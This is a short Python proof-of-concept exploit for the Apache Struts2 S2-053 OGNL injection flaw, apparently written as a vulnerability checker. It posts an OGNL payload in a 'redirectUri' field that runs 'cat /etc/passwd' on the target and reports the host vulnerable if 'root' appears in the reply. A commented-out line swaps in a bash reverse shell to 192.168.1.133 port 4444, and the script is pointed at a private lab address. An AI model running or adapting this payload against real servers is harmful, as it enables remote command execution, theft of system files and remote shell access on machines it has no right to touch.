import requests
requests.packages.urllib3.disable_warnings()
def run(url):
    """Version: 2.0.1/2.3.33/2.5-2.5.10
    remote code execution"""
    payload = """%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"""
    payload += 'cat /etc/passwd'    
    # payload += 'bash -i >& /dev/tcp/192.168.1.133/4444 0>&1'    
    payload += """').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n"""
    headers = {
        'redirectUri':payload
    }

    req = requests.post(url=url, data=headers, timeout=3)

    if "root" in req.text:
        return "s2-053 Vulnerable"    
    else:
        return False


if __name__ == '__main__':
	run("http://192.168.27.128:8080/hello.action")